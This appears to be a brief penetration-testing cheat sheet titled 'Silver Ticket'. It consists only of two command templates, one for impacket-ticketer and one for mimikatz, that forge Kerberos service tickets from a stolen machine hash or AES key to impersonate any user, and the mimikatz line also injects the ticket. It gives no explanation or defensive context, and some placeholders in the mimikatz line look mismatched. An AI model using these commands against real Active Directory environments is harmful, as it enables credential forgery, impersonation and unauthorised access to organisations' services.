# Silver Ticket

 - impacket-ticketer -nthash MACHINE_NT_HASH -domain-sid DOMAIN_SID -domain DOMAIN ANY_USER

 - mimikatz "kerberos::golden /sid:CURRENT_USER_SID /domain:DOMAIN_SID /target:TARGET_SERVER /service:TARGET_SERVICE /aes256:COMPUTER_AES256_KEY /user:ANY_USER /ptt"
